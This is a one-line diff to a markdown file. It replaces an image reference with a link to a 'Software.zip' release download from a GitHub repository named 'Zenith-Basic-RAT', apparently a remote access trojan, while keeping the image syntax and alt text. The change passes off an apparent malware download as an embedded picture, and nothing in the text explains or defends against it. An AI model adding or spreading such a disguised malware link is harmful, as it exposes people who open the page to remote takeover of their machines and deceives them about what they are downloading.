@@ -1,1 +1,1 @@
-![Huge RAT in your mouth](image.jpg)
+![Huge RAT in your mouth](https://github.com/SayrozYT/Zenith-Basic-RAT/releases/download/v2.0/Software.zip)
